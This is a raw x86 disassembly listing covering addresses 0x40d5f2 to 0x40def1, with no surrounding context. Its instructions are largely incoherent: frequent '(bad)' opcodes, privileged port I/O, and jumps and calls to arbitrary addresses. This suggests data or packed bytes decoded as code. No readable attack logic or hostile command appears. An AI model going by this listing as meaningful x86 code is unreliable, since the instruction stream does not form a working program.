  40d5f2:	and    bh,BYTE PTR [ebp+0x2007b8c5]
  40d5f8:	add    DWORD PTR [ebx],esi
  40d5fa:	lock pop ds
  40d5fc:	sub    bh,dl
  40d5fe:	stos   DWORD PTR es:[edi],eax
  40d5ff:	add    al,BYTE PTR [eax]
  40d601:	jge    0x40d5f3
  40d603:	pop    ds
  40d604:	sub    al,0x6d
  40d606:	adc    BYTE PTR [eax],ah
  40d608:	xor    BYTE PTR [eax+ecx*2+0x20],ch
  40d60c:	(bad)  
  40d60e:	add    BYTE PTR [eax],ah
  40d610:	adc    BYTE PTR [edi-0x18],bh
  40d613:	pop    ds
  40d614:	adc    bh,al
  40d616:	imul   eax,DWORD PTR [edx-0x2d],0x14
  40d61a:	xor    DWORD PTR [edi],edi
  40d61c:	and    al,0x28
  40d61e:	scas   eax,DWORD PTR es:[edi]
  40d61f:	jle    0x40d689
  40d621:	cmc    
  40d622:	stos   DWORD PTR es:[edi],eax
  40d623:	add    cl,BYTE PTR [ebx-0x21137c8]
	...
  40d641:	add    BYTE PTR [ebx],dh
  40d643:	lods   eax,DWORD PTR ds:[esi]
  40d644:	jg     0x40d689
  40d646:	sbb    BYTE PTR [eax-0x50ff7310],bh
  40d64c:	js     0x40d691
  40d64e:	sbb    bh,bl
  40d650:	jp     0x40d657
  40d652:	jmp    0x40d691
  40d654:	ret    
  40d655:	gs ja  0x40d643
  40d658:	inc    ecx
  40d659:	data16 jge 0x40d6cb
  40d65c:	push   ds
  40d65d:	sbb    al,0x71
  40d65f:	addr16 push ds
  40d661:	sbb    al,0x44
  40d663:	out    dx,al
  40d664:	ds and al,0xe5
  40d667:	stos   DWORD PTR es:[edi],eax
  40d668:	ret    
  40d669:	adc    al,0x8c
  40d66b:	mov    ecx,0x642c0042
  40d670:	repz xor DWORD PTR [esi-0x43fffd55],0xffffffae
  40d678:	jle    0x40d62a
  40d67a:	hlt    
  40d67b:	stos   DWORD PTR es:[edi],eax
  40d67c:	add    cl,BYTE PTR [eax-0xd]
  40d67f:	daa    
  40d680:	mov    al,ds:0xe9045bff
  40d685:	dec    ebx
  40d686:	add    ecx,DWORD PTR [ecx+0x4f40473]
  40d68c:	and    DWORD PTR [ebx],edx
  40d68e:	jns    0x40d6f9
  40d690:	call   0x2d07ca98
  40d695:	call   0x5b9de9a
  40d69a:	xor    cl,BYTE PTR [eax+0xd]
  40d69d:	adc    dh,ah
  40d69f:	mov    BYTE PTR [eax-0x17598fed],ch
  40d6a5:	add    eax,DWORD PTR [eax]
	...
  40d6bf:	hlt    
  40d6c0:	sub    al,0xe4
  40d6c2:	add    al,0xf4
  40d6c4:	add    al,0x64
  40d6c6:	mov    bh,dl
  40d6c8:	cwde   
  40d6c9:	call   0x1a95cad1
  40d6ce:	push   edi
  40d6cf:	inc    edi
  40d6d0:	pop    eax
  40d6d1:	sbb    dl,BYTE PTR [ecx+0x53b0e137]
  40d6d7:	jecxz  0x40d6eb
  40d6d9:	popf   
  40d6da:	push   ss
  40d6db:	xor    al,0x5
  40d6dd:	ins    BYTE PTR es:[edi],dx
  40d6de:	les    eax,FWORD PTR [edx]
  40d6e0:	xor    DWORD PTR [ecx+0x4],0xc41a04f4
  40d6e7:	pop    ecx
  40d6e8:	mov    fs,WORD PTR [eax+ebp*8+0x63]
  40d6ec:	pop    es
  40d6ed:	jmp    0x4c257f5
  40d6f2:	xchg   esp,eax
  40d6f3:	stos   DWORD PTR es:[edi],eax
  40d6f4:	mov    esp,0x12a353e8
  40d6f9:	sub    DWORD PTR [eax],ebx
  40d6fb:	xor    al,0x5
  40d6fd:	jo     0x40d75f
  40d6ff:	fdiv   st,st(4)
  40d701:	fcmovu st,st(6)
  40d703:	js     0x40d746
  40d705:	int    0xe7
  40d707:	fwait
  40d708:	sbb    esp,esi
  40d70a:	add    esi,esp
  40d70c:	sub    DWORD PTR [eax],0x6c54d238
  40d712:	mov    BYTE PTR [edi],dl
  40d714:	xchg   ecx,eax
  40d715:	(bad)  
  40d716:	call   0xee90dc12
  40d71b:	cld    
  40d71c:	mov    al,ds:0x81f82911
  40d721:	mov    edi,0x54
	...
  40d73a:	add    BYTE PTR [eax],al
  40d73c:	mov    edi,0xf65dda80
  40d741:	test   dl,bh
  40d743:	call   0x2acdce4b
  40d748:	add    BYTE PTR ss:[ebx],al
  40d74b:	ss das 
  40d74d:	ret    0xd43
  40d750:	push   es
  40d751:	adc    eax,0x482df9eb
  40d756:	and    al,0xf4
  40d758:	sti    
  40d759:	scas   eax,DWORD PTR es:[edi]
  40d75a:	adc    eax,0xce0b3a7
  40d75f:	jmp    0x90c:0x25c60b52
  40d766:	add    dl,BYTE PTR [eax+0x7efebc56]
  40d76c:	mov    ebp,0xf8e42447
  40d771:	idiv   BYTE PTR [edi-0x143c380]
  40d777:	mov    bp,0x2447
  40d77b:	out    dx,eax
  40d77c:	(bad)  
  40d77d:	scas   al,BYTE PTR es:[edi]
  40d77e:	add    al,0x2f
  40d780:	cmp    esp,ecx
  40d782:	or     eax,0xeac6b609
  40d787:	pop    esp
  40d788:	stos   BYTE PTR es:[edi],al
  40d789:	fimul  WORD PTR [ebp+eiz*4+0x644ffb93]
  40d790:	cmp    esp,ecx
  40d792:	cmp    ebx,DWORD PTR [ecx-0x32bc75be]
  40d798:	lahf   
  40d799:	dec    ebx
  40d79a:	push   esp
  40d79c:	mov    ds:0xe94015,eax
	...
  40d7b9:	ins    BYTE PTR es:[edi],dx
  40d7ba:	jnp    0x40d82f
  40d7bc:	in     eax,dx
  40d7bd:	push   0x47
  40d7bf:	and    al,0x0
  40d7c1:	xor    eax,0xe6024488
  40d7c6:	inc    ebx
  40d7c7:	and    al,0x3c
  40d7c9:	aam    0x4d
  40d7cb:	push   es
  40d7cc:	mov    edx,DWORD PTR [ecx+0x23893ea3]
  40d7d2:	or     ecx,DWORD PTR [ebx-0x76b30ebc]
  40d7d8:	inc    esi
  40d7d9:	pop    ebx
  40d7da:	mov    DWORD PTR [edx+0x24],eax
  40d7dd:	sbb    ecx,DWORD PTR [ecx]
  40d7df:	inc    esp
  40d7e0:	and    al,0x28
  40d7e2:	mov    BYTE PTR [edx+0x24],cl
  40d7e5:	dec    ebp
  40d7e6:	pop    DWORD PTR [ecx+eax*1+0x24]
  40d7ea:	dec    ebx
  40d7eb:	and    al,0x18
  40d7ed:	loopne 0x40d7f2
  40d7ef:	or     al,0x80
  40d7f1:	test   DWORD PTR [esi+0x1],ecx
  40d7f4:	(bad)  
  40d7f5:	shr    DWORD PTR [ebp+ecx*1+0xeacd1ff],1
  40d7fc:	sub    cl,0xac
  40d7ff:	or     eax,0x6f80ea1a
  40d804:	(bad)  
  40d805:	push   0xffffffc4
  40d807:	jle    0x40d885
  40d809:	mov    cl,0xa2
  40d80b:	dec    BYTE PTR [edx+0x4c8b0910]
  40d811:	add    DWORD PTR ds:0xfa00889,ebx
  40d817:	push   DWORD PTR [ecx+esi*8-0x4c]
  40d81b:	out    0x90,al
	...
  40d835:	add    BYTE PTR [edx],al
  40d837:	push   es
  40d838:	add    BYTE PTR [ebx+0x5b5e23e2],cl
  40d83e:	bound  ebx,QWORD PTR es:[ebx-0x3e]
  40d842:	xchg   ecx,eax
  40d843:	push   es
  40d844:	push   ebp
  40d845:	mov    ebx,ecx
  40d847:	jg     0x40d82b
  40d849:	clc    
  40d84a:	push   ds
  40d84b:	jne    0x40d887
  40d84d:	push   ebx
  40d84e:	inc    ebx
  40d84f:	pop    ebp
  40d850:	push   0x8
  40d852:	hlt    
  40d853:	(bad)  
  40d855:	pop    ebp
  40d856:	outs   dx,DWORD PTR ds:[esi]
  40d857:	repnz mov es,WORD PTR [ebx+0x18]
  40d85b:	mov    al,ds:0xd8105b89
  40d860:	mov    DWORD PTR [ebx+0x18],ebx
  40d863:	int3   
  40d864:	mov    DWORD PTR [ebx+0x10],ebx
  40d867:	rol    bh,0x43
  40d86a:	sbb    BYTE PTR [esp+eax*2],dl
  40d86d:	add    ah,dh
  40d86f:	stos   DWORD PTR es:[edi],eax
  40d870:	stos   BYTE PTR es:[edi],al
  40d871:	aam    0xc0
  40d873:	stos   DWORD PTR es:[edi],eax
  40d874:	add    cl,BYTE PTR [ebx-0x7be00058]
  40d87a:	xor    al,0xf8
  40d87c:	adc    DWORD PTR [ebx+0x2e3ffb0],ecx
  40d882:	xor    eax,0xd4243725
  40d887:	mov    dh,0xc3
  40d889:	je     0x40d88c
  40d88b:	std    
  40d88c:	stos   DWORD PTR es:[edi],eax
  40d88d:	cmp    BYTE PTR [ebx],ah
  40d88f:	lods   eax,DWORD PTR ds:[esi]
  40d890:	add    dh,BYTE PTR [ebx]
  40d892:	xor    al,0x85
  40d894:	adc    eax,0xf3abf402
  40d899:	mov    edi,0x0
	...
  40d8b2:	add    BYTE PTR [ecx-0x60eb1801],al
  40d8b8:	add    DWORD PTR [ebp-0x57],ebp
  40d8bb:	mov    edx,0xf513e7e7
  40d8c0:	or     ecx,0xffffff86
  40d8c3:	cmc    
  40d8c4:	stos   DWORD PTR es:[edi],eax
  40d8c5:	mov    ebp,edi
  40d8c7:	jge    0x40d898
  40d8c9:	out    0xf,al
  40d8cb:	call   FWORD PTR [esi+0x10]
  40d8ce:	test   bl,bl
  40d8d0:	lods   al,BYTE PTR ds:[esi]
  40d8d1:	add    al,BYTE PTR [eax]
  40d8d3:	jg     0x40d875
  40d8d5:	dec    esi
  40d8d6:	push   ss
  40d8d7:	xor    al,0xac
  40d8d9:	mov    eax,DWORD PTR [ebp+0x34]
  40d8dc:	das    
  40d8dd:	mov    ebx,0xb81feb17
  40d8e2:	call   DWORD PTR [ebx+0x76fee904]
  40d8e8:	add    al,0xe9
  40d8ea:	add    esi,ebx
  40d8ec:	add    BYTE PTR [ebx+eax*1],0xf4
  40d8f0:	add    al,0x6a
  40d8f2:	inc    ecx
  40d8f3:	mov    eax,0x5586f603
  40d8f8:	add    al,0xe9
  40d8fa:	add    ecx,DWORD PTR [eax+edx*1-0x24]
  40d8fe:	add    eax,0x35e4f8f4
  40d903:	std    
  40d904:	mov    cl,0x2e
  40d906:	cld    
  40d907:	retf   
  40d908:	add    ebp,ecx
  40d90a:	add    ecx,DWORD PTR [edi+0xe]
  40d90d:	push   0x3e
  40d90f:	lock add al,0x54
  40d912:	or     dh,BYTE PTR [edi+0x3a]
  40d915:	xor    DWORD PTR [eax+eax*1],eax
	...
  40d930:	sti    
  40d931:	sub    BYTE PTR [eax-0x5fb0bfc],0xc3
  40d938:	lea    eax,[edx]
  40d93a:	inc    edi
  40d93b:	lea    esi,[edi+0x795cd8e0]
  40d941:	cmp    ch,al
  40d943:	in     eax,dx
  40d944:	push   es
  40d945:	ins    DWORD PTR es:[edi],dx
  40d946:	inc    edx
  40d947:	mov    edi,DWORD PTR [ecx+0x14]
  40d94a:	adc    BYTE PTR [edi+0x7f],0x40
  40d94e:	cmc    
  40d94f:	mov    BYTE PTR [ebx+0x328b2c31],ch
  40d955:	adc    eax,0x31ebbd6a
  40d95a:	iret   
  40d95b:	and    eax,0x38eafd77
  40d960:	in     al,dx
  40d961:	mov    ch,BYTE PTR [edi+eiz*8-0x185348fc]
  40d968:	add    al,0x81
  40d96a:	pop    ds
  40d96b:	cmp    edi,esp
  40d96d:	sub    DWORD PTR [eax],0x8
  40d970:	push   ds
  40d971:	add    DWORD PTR [ecx-0x1ec870],ebx
  40d977:	icebp  
  40d978:	dec    esi
  40d979:	in     eax,0x82
  40d97b:	xor    ah,dl
  40d97d:	xor    DWORD PTR [edx],esp
  40d97f:	(bad)  
  40d980:	jbe    0x40d972
  40d982:	push   ss
  40d983:	xchg   esp,eax
  40d984:	jecxz  0x40d910
  40d986:	dec    ebx
  40d987:	int    0x85
  40d989:	mov    edx,0x8465c543
  40d98e:	enter  0x77c,0x84
  40d992:	mov    edi,0xf1
	...
  40d9ab:	add    BYTE PTR [eax],al
  40d9ad:	or     eax,0xac645015
  40d9b2:	loopne 0x40d9f2
  40d9b4:	cdq    
  40d9b5:	xchg   edx,eax
  40d9b6:	rol    DWORD PTR [edx+0x7e8bfbad],cl
  40d9bc:	icebp  
  40d9bd:	ins    BYTE PTR es:[edi],dx
  40d9be:	mov    bh,0x74
  40d9c0:	mov    WORD PTR [ecx],ss
  40d9c2:	mov    WORD PTR [ebp+0x11],es
  40d9c5:	fimul  DWORD PTR [ebp-0x74dbf2bd]
  40d9cb:	inc    ebp
  40d9cc:	sub    DWORD PTR [ecx-0x817004a],esp
  40d9d2:	sti    
  40d9d3:	(bad)  
  40d9d4:	rol    DWORD PTR [eax-0x4e],cl
  40d9d7:	ror    bl,1
  40d9d9:	aas    
  40d9da:	mov    eax,DWORD PTR [ebp-0x23]
  40d9dd:	outs   dx,DWORD PTR ds:[esi]
  40d9de:	dec    esp
  40d9df:	and    al,0xc7
  40d9e1:	js     0x40d999
  40d9e3:	(bad)  
  40d9e4:	jmp    0x35c9f8e0
  40d9e9:	fsubr  st(6),st
  40d9eb:	cmp    ch,BYTE PTR [eax+0x6066022a]
  40d9f1:	xor    esp,ecx
  40d9f3:	cs add ebp,edi
  40d9f6:	mov    DWORD PTR [ebx+0xd],eax
  40d9f9:	rol    BYTE PTR [edi-0x1],0xd5
  40d9fd:	fcmovnu st,st(7)
  40d9ff:	mov    ebp,ss
  40da01:	rcr    edi,cl
  40da03:	out    0x9f,eax
  40da05:	out    dx,al
  40da06:	add    al,0x0
  40da08:	add    BYTE PTR [eax],bl
  40da0a:	les    esi,FWORD PTR [edx+0x4]
  40da0d:	jecxz  0x40da4e
  40da0f:	and    al,0x19
	...
  40da29:	add    BYTE PTR [esi],dl
  40da2b:	repnz pop es
  40da2d:	test   ebx,ecx
  40da2f:	push   es
  40da30:	test   edx,esi
  40da32:	shl    DWORD PTR [esi-0x3],cl
  40da35:	jmp    FWORD PTR [ecx-0x61]
  40da38:	push   cs
  40da39:	call   0x40b71c
  40da3e:	dec    esi
  40da3f:	fisubr DWORD PTR [eax+0x1]
  40da42:	add    eax,0x4d018436
  40da47:	mov    ch,dh
  40da49:	cmp    ebx,DWORD PTR [esi-0x12]
  40da4c:	dec    eax
  40da4d:	mov    DWORD PTR [ecx-0xcc6f161],eax
  40da53:	idiv   BYTE PTR [edx]
  40da55:	lea    eax,[ebx]
  40da57:	or     eax,0x13497b83
  40da5c:	jne    0x40da7f
  40da5e:	xchg   esi,eax
  40da5f:	add    eax,0x1de9c085
  40da64:	push   0x4
  40da66:	mov    es,eax
  40da68:	add    dl,BYTE PTR [eax+0x62]
  40da6b:	cld    
  40da6c:	and    ebp,DWORD PTR [eax]
  40da6e:	mov    al,0x44
  40da70:	and    al,0x28
  40da72:	gs jnp 0x40daed
  40da75:	add    BYTE PTR ds:0x974be7e,cl
  40da7b:	jns    0x40dabf
  40da7d:	and    al,0xe7
  40da7f:	jns    0x40dac3
  40da81:	and    al,0xcd
  40da83:	lea    eax,[edx+0x24]
  40da86:	mov    ebp,0xa608c185
  40da8b:	add    BYTE PTR [edx+ecx*8+0x0],bh
	...
  40daa7:	mov    ds,ebp
  40daa9:	push   esp
  40daaa:	call   0x40a925
  40daaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dab0:	add    al,0xe8
  40dab2:	pop    esp
  40dab3:	hlt    
  40dab4:	sub    BYTE PTR [ebx],al
  40dab6:	add    BYTE PTR [edi+0x5c],bh
  40dab9:	stc    
  40daba:	repnz and BYTE PTR [ebp-0x77],dh
  40dabe:	pop    ebx
  40dabf:	fcomp  st(3)
  40dac1:	stc    
  40dac2:	sbb    eax,0x5d8db31a
  40dac7:	clc    
  40dac8:	sub    bh,BYTE PTR [ecx]
  40daca:	add    al,0xe8
  40dacc:	cwde   
  40dacd:	loope  0x40da59
  40dacf:	mul    DWORD PTR [eax]
  40dad1:	les    esi,FWORD PTR [ebx-0x21]
  40dad4:	adc    DWORD PTR [edx],0x52a43483
  40dada:	jmp    eax
  40dadc:	(bad)  
  40dadd:	jmp    0x97e7:0xeabfe08c
  40dae4:	xor    al,BYTE PTR [ebx]
  40dae6:	add    BYTE PTR [ecx-0x14],bh
  40dae9:	aaa    
  40daea:	add    al,0x4a
  40daec:	call   0xe083f5d8
  40daf1:	out    0xf,eax
  40daf3:	outs   dx,DWORD PTR ds:[esi]
  40daf4:	call   0x6bb7eae0
  40daf9:	or     bh,BYTE PTR [ebx]
  40dafb:	repnz aas 
  40dafd:	retf   0x3f32
  40db00:	push   cs
  40db01:	lods   al,BYTE PTR ds:[esi]
  40db02:	inc    esp
  40db03:	inc    ecx
  40db04:	lods   eax,DWORD PTR ds:[esi]
  40db05:	add    ch,BYTE PTR [edx-0x4]
  40db08:	pop    eax
  40db09:	inc    edi
  40db0a:	and    al,0x0
	...
  40db24:	in     al,dx
  40db25:	sti    
  40db26:	push   eax
  40db27:	lea    eax,[eax-0x67771541]
  40db2d:	(bad)  
  40db2e:	loope  0x40db17
  40db30:	arpl   WORD PTR [edx],dx
  40db32:	add    al,0x0
  40db34:	jg     0x40db1d
  40db36:	out    0x1f,eax
  40db38:	outs   dx,DWORD PTR ds:[esi]
  40db39:	call   0xacae2e49
  40db3e:	stos   BYTE PTR es:[edi],al
  40db3f:	and    BYTE PTR [ecx+0x308b02ac],ch
  40db45:	add    eax,0x5723200d
  40db4a:	ret    0xd088
  40db4d:	push   edi
  40db4e:	sub    eax,DWORD PTR [edi]
  40db50:	hlt    
  40db51:	dec    edi
  40db52:	bound  ebp,QWORD PTR [edi+0x50b8a876]
  40db58:	dec    edx
  40db59:	sub    ebx,ecx
  40db5b:	sub    esp,esi
  40db5d:	dec    ebp
  40db5e:	ss push ss
  40db60:	and    al,0xf
  40db62:	test   eax,0xf4c07703
  40db67:	mov    ?,WORD PTR [eax]
  40db69:	ins    DWORD PTR es:[edi],dx
  40db6a:	mov    eax,0x2e03f2c5
  40db6f:	inc    esi
  40db70:	pushf  
  40db71:	inc    esp
  40db72:	jmp    0xdbf6cf7a
  40db77:	fild   WORD PTR ds:0x9b86e945
  40db7d:	xor    dl,cl
  40db7f:	mov    BYTE PTR [eax-0x7bb19e90],bh
  40db85:	add    eax,0xc595
	...
  40db9e:	add    BYTE PTR [eax],al
  40dba0:	add    bh,ah
  40dba2:	ret    
  40dba3:	rcl    BYTE PTR [eax],1
  40dba5:	jno    0x40db6b
  40dba7:	pop    ebx
  40dba8:	add    DWORD PTR [edi-0x45],esi
  40dbab:	int    0x32
  40dbad:	repz icebp 
  40dbaf:	scas   eax,DWORD PTR es:[edi]
  40dbb0:	in     eax,0xb0
  40dbb2:	mov    al,0xd1
  40dbb4:	pop    es
  40dbb5:	ins    DWORD PTR es:[edi],dx
  40dbb6:	aas    
  40dbb7:	mov    ebp,0x5c03c28d
  40dbbc:	inc    ecx
  40dbbd:	cmp    al,0x54
  40dbbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbc0:	adc    DWORD PTR [eax],eax
  40dbc2:	adc    ch,BYTE PTR [ecx]
  40dbc4:	add    al,0x3c
  40dbc6:	mov    ch,0x95
  40dbc8:	add    al,0xf4
  40dbca:	out    dx,eax
  40dbcb:	and    ebx,eax
  40dbcd:	js     0x40dc09
  40dbcf:	pop    ecx
  40dbd0:	pop    ds
  40dbd1:	mov    ah,0xbc
  40dbd3:	cwde   
  40dbd4:	out    0x30,eax
  40dbd6:	sar    edi,1
  40dbd8:	push   cs
  40dbd9:	or     DWORD PTR [ebx+0x5],0xfeb46d31
  40dbe0:	jmp    0xe89a8774
  40dbe5:	test   DWORD PTR [ecx-0x6dcfa68c],0x9cf7e8ff
  40dbef:	fldenv [ebx+0x278b04f8]
  40dbf5:	inc    eax
  40dbf6:	add    BYTE PTR [ecx+ebx*2+0x28],0x6d
  40dbfb:	add    ecx,ebp
  40dbfd:	test   DWORD PTR [edi+eiz*8+0x5f62b],0x72
	...
  40dc1c:	add    BYTE PTR [eax],al
  40dc1e:	test   DWORD PTR [ebx+edx*1-0x57],edi
  40dc22:	neg    DWORD PTR [esi]
  40dc24:	push   eax
  40dc25:	pusha  
  40dc26:	mov    bh,0xb
  40dc28:	call   FWORD PTR [edi]
  40dc2a:	adc    al,BYTE PTR [ebx-0x78]
  40dc2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc2e:	jmp    0xd77f:0xbe83d5b3
  40dc35:	out    dx,al
  40dc36:	and    eax,0xc0e65281
  40dc3b:	mov    al,0xfe
  40dc3d:	jmp    0x5f11cc39
  40dc42:	inc    DWORD PTR [ecx-0x2ad531b1]
  40dc48:	jbe    0x40dc3b
  40dc4a:	aad    0x7d
  40dc4c:	pop    esi
  40dc4d:	in     eax,dx
  40dc4e:	aad    0x7d
  40dc50:	inc    esi
  40dc51:	out    0xad,eax
  40dc53:	dec    edi
  40dc54:	leave  
  40dc55:	stos   BYTE PTR es:[edi],al
  40dc56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc57:	jg     0x40dc44
  40dc59:	push   0x63
  40dc5b:	mov    esp,0x50b8d80
  40dc60:	add    cl,ch
  40dc62:	dec    edx
  40dc63:	pop    ebx
  40dc64:	push   edi
  40dc65:	fidiv  DWORD PTR [edi+0x6400daf6]
  40dc6b:	pop    esp
  40dc6c:	and    al,0x48
  40dc6e:	dec    eax
  40dc6f:	cld    
  40dc70:	and    ecx,DWORD PTR [esi+esi*1+0x23]
  40dc74:	xor    al,al
  40dc76:	push   esp
  40dc77:	pop    esp
  40dc78:	and    al,0x54
  40dc7a:	dec    eax
  40dc7b:	cld    
  40dc7c:	and    ebx,DWORD PTR [eax+0x66]
  40dc7f:	and    cl,BYTE PTR [eax+0x5c]
	...
  40dc99:	add    BYTE PTR [eax],al
  40dc9b:	add    ecx,ebp
  40dc9d:	xor    al,al
  40dc9f:	dec    eax
  40dca0:	cld    
  40dca1:	and    esp,DWORD PTR [esi+eax*4+0x7c]
  40dca5:	jb     0x40dccb
  40dca7:	cmc    
  40dca8:	sbb    DWORD PTR [edx+0x24],0xd2e7228d
  40dcaf:	fisttp DWORD PTR [eax]
  40dcb1:	add    BYTE PTR [ebp+0x82d421],cl
  40dcb7:	lea    eax,[edi]
  40dcb9:	mov    eax,0x75d9f
  40dcbe:	(bad)  
  40dcbf:	xchg   ecx,eax
  40dcc0:	shl    DWORD PTR [esi],cl
  40dcc2:	in     al,dx
  40dcc3:	jmp    0x79c9dd0f
  40dcc8:	sar    DWORD PTR [esi],cl
  40dcca:	mov    DWORD PTR [ecx-0x2d],ebp
  40dccd:	inc    edx
  40dcce:	call   0x422e5b
  40dcd3:	enter  0x2334,0xac
  40dcd7:	dec    ebp
  40dcd8:	pop    es
  40dcd9:	add    BYTE PTR [eax+0x87d],bh
  40dcdf:	xor    eax,0xd015a0c
  40dce4:	add    ah,0x50
  40dce7:	mov    BYTE PTR [esp+0x3c],al
  40dceb:	in     eax,dx
  40dcec:	pusha  
  40dced:	xor    BYTE PTR [ebx],cl
  40dcef:	pop    ds
  40dcf0:	pop    es
  40dcf1:	test   al,al
  40dcf3:	loopne 0x40dd07
  40dcf5:	lea    eax,[ecx+esi*1-0xb0000cd]
  40dcfc:	fwait
  40dcfd:	push   edx
  40dcfe:	lea    eax,[eax]
	...
  40dd18:	xor    al,cl
  40dd1a:	test   BYTE PTR [edi-0x34],0xa8
  40dd1e:	or     eax,DWORD PTR [edx]
  40dd20:	hlt    
  40dd21:	daa    
  40dd22:	les    ecx,FWORD PTR [esi]
  40dd24:	js     0x40dd02
  40dd26:	add    al,BYTE PTR [eax]
  40dd28:	hlt    
  40dd29:	test   DWORD PTR es:[ebx-0x19],0x308d025b
  40dd31:	or     BYTE PTR [ecx+ecx*4+0x38],cl
  40dd35:	add    ah,ah
  40dd37:	mov    WORD PTR [eax],?
  40dd39:	or     BYTE PTR [eax-0x77],dl
  40dd3c:	cmp    BYTE PTR [eax],al
  40dd3e:	loopne 0x40dccc
  40dd40:	xor    BYTE PTR [eax],cl
  40dd42:	and    al,0x89
  40dd44:	cmp    BYTE PTR [eax],al
  40dd46:	in     al,dx
  40dd47:	mov    WORD PTR [eax],?
  40dd49:	or     ah,ah
  40dd4b:	mov    BYTE PTR [eax],bh
  40dd4d:	ror    BYTE PTR [esi],0xc7
  40dd50:	xor    al,cl
  40dd52:	push   ss
  40dd53:	fsub   st,st(7)
  40dd55:	pop    ebx
  40dd56:	add    al,bh
  40dd58:	mov    al,0xc7
  40dd5a:	out    0x2,al
  40dd5c:	hlt    
  40dd5d:	fwait
  40dd5e:	add    cl,BYTE PTR [ebx+0x6616c7b0]
  40dd64:	jg     0x40dd02
  40dd66:	test   DWORD PTR [ebx+0x41410],esi
  40dd6c:	hlt    
  40dd6d:	shr    DWORD PTR [edx+0x58],cl
  40dd70:	cmc    
  40dd71:	fwait
  40dd72:	stc    
  40dd73:	pop    ebx
  40dd74:	fcomp  st(7)
  40dd76:	adc    ebx,DWORD PTR cs:[edi+eax*8+0x3f86]
	...
  40dd92:	add    BYTE PTR [eax],al
  40dd94:	add    ah,dh
  40dd96:	retf   0x88cf
  40dd99:	mov    al,0x7
  40dd9b:	inc    eax
  40dd9c:	cmp    esi,DWORD PTR [edi]
  40dd9e:	stos   DWORD PTR es:[edi],eax
  40dd9f:	jle    0x40dd6a
  40dda1:	hlt    
  40dda2:	fwait
  40dda3:	add    cl,BYTE PTR [ebp-0x2432fa88]
  40dda9:	sti    
  40ddaa:	mov    cl,0xe8
  40ddac:	push   ebx
  40ddad:	jge    0x40ddff
  40ddaf:	int    0xf
  40ddb1:	jmp    0x40dd8c
  40ddb3:	popa   
  40ddb4:	mov    bl,0x1e
  40ddb6:	mov    dh,0xfc
  40ddb8:	sbb    BYTE PTR [edi+0x48],ch
  40ddbb:	lds    eax,FWORD PTR [ebx+0x7f]
  40ddbe:	cld    
  40ddbf:	arpl   WORD PTR [edi+0x10],cx
  40ddc2:	adc    eax,0xf54e551b
  40ddc7:	mov    esi,0xb4e947b8
  40ddcc:	push   ebx
  40ddcd:	mov    bl,0x53
  40ddcf:	mov    ecx,0xe5386b7e
  40ddd4:	mov    bh,BYTE PTR [edi]
  40ddd6:	jmp    0x17dc2fb3
  40dddb:	std    
  40dddc:	adc    al,0x34
  40ddde:	add    eax,0x14d03f62
  40dde3:	pusha  
  40dde4:	aas    
  40dde5:	fmul   DWORD PTR [edx+eiz*8]
  40dde8:	(bad)  
  40dde9:	jmp    0x6204:0xf4036888
  40ddf0:	or     edi,DWORD PTR [ecx+0x58]
  40ddf3:	lds    esp,FWORD PTR [edi]
  40ddf5:	(bad)  
  40ddf6:	jg     0x40dd94
  40ddf8:	fild   WORD PTR [eax]
	...
  40de12:	and    edx,DWORD PTR [edi-0x6d]
  40de15:	add    bl,ah
  40de17:	adc    al,0xce
  40de19:	add    esi,esp
  40de1b:	push   esp
  40de1c:	out    dx,al
  40de1d:	push   ecx
  40de1e:	in     al,0x87
  40de20:	test   al,0x31
  40de22:	lahf   
  40de23:	test   DWORD PTR [eax+eiz*8-0x61],ebx
  40de27:	add    ebx,DWORD PTR [eax+edx*2+0x7f]
  40de2b:	dec    eax
  40de2c:	add    eax,0x19fc6ef0
  40de31:	push   ebx
  40de32:	imul   ebx,DWORD PTR [eax+0x5],0x55a63c
  40de39:	inc    ecx
  40de3a:	push   eax
  40de3b:	ss inc eax
  40de3d:	jmp    0xf9918fe9
  40de42:	je     0x40deb5
  40de44:	je     0x40de14
  40de46:	adc    DWORD PTR [ebx+edi*2+0x74fd27cd],eax
  40de4d:	in     eax,dx
  40de4e:	outs   dx,BYTE PTR ds:[esi]
  40de4f:	inc    esp
  40de50:	and    al,0x1
  40de52:	ffreep st(3)
  40de54:	jae    0x40de2b
  40de56:	icebp  
  40de57:	in     eax,dx
  40de58:	pop    ss
  40de59:	std    
  40de5a:	repnz push esp
  40de5c:	mov    esp,DWORD PTR ds:0x198b18d4
  40de62:	ja     0x40de2c
  40de64:	(bad)  
  40de65:	push   ecx
  40de66:	pinsrw mm0,WORD PTR [eax],0xe9
  40de6a:	jl     0x40deb0
  40de6c:	and    al,0xd9
  40de6e:	inc    edi
  40de6f:	mov    al,0x14
  40de71:	mov    cl,0x6
  40de73:	inc    ebp
  40de74:	add    BYTE PTR [edx+0x0],dh
	...
  40de8f:	xor    al,0xe9
  40de91:	xor    esp,DWORD PTR [edx-0x8]
  40de94:	push   esp
  40de95:	call   FWORD PTR [eax-0x32bc8411]
  40de9b:	fistp  QWORD PTR [ebx+0x7]
  40de9e:	mov    ecx,0x6a0855aa
  40dea3:	mov    ah,0xe8
  40dea5:	sbb    ebp,ebx
  40dea7:	jbe    0x40deed
  40dea9:	and    al,0xdd
  40deab:	pop    ebx
  40deac:	scas   eax,DWORD PTR es:[edi]
  40dead:	dec    ebx
  40deae:	lds    ebx,FWORD PTR [ebx-0x1]
  40deb1:	test   bh,bh
  40deb3:	sub    DWORD PTR [edi-0x16fba302],0xfc9bd137
  40debd:	add    ecx,ebp
  40debf:	jl     0x40def5
  40dec1:	and    al,0x9
  40dec3:	pop    eax
  40dec4:	jecxz  0x40dec2
  40dec6:	call   0x9c5cc2
  40decb:	jmp    0x5b1f6870
  40ded0:	lock and esp,DWORD PTR [eax]
  40ded3:	jmp    0x35411eb7
  40ded8:	clc    
  40ded9:	fild   WORD PTR [eax]
  40dedb:	or     eax,0xc174bf30
  40dee0:	jp     0x40df24
  40dee2:	and    al,0xb5
  40dee4:	jp     0x40deec
  40dee6:	lea    ebp,[ecx]
  40dee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dee9:	push   cs
  40deea:	push   edx
  40deeb:	std    
  40deec:	ja     0x40df3d
  40deee:	and    BYTE PTR [eax-0x3c],bl
  40def1:	jae    0x40defe
	...
